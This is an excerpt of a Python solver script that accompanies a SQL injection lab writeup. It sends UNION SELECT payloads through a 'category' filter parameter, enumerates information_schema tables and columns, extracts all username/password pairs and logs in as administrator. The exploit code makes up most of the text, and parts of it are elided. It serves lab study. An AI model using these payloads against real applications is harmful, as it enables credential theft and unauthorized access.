...
Companion script for the writeup: 05-list-database-contents-non-oracle.md

What this does:
    Confirms the UNION column count and text column, then crawls the schema
    through information_schema.tables and information_schema.columns to find
    the (randomized-name) credentials table, extracts every username/password
    pair, and logs in as administrator with the recovered password.

Usage:
    python 05-list-database-contents-non-oracle.py <lab-url>
...
def union_extract(client: httpx.Client, url: str, column_count: int, string_col_index: int, expr: str) -> str:
    parts = ["NULL"] * column_count
    parts[string_col_index] = expr
    r = client.get(f"{url}/filter", params={"category": f"Gifts' UNION SELECT {','.join(parts)}-- "})
    return r.text
...
def solve(lab_url: str) -> None:
    ...
    tables_html = union_extract(
        ...
        "'XMKX'||table_name||'XMKX' FROM information_schema.tables "
    ...
    cols_html = union_extract(
        client, lab_url, column_count, string_col_index,
        f"'XMKX'||column_name||'XMKX' FROM information_schema.columns WHERE table_name='{users_table}'",
    )
    ...
    creds_html = union_extract(
        client, lab_url, column_count, string_col_index,
        f"'XMKX'||{user_col}||'~'||{pass_col}||'XMKX' FROM {users_table}",
    )
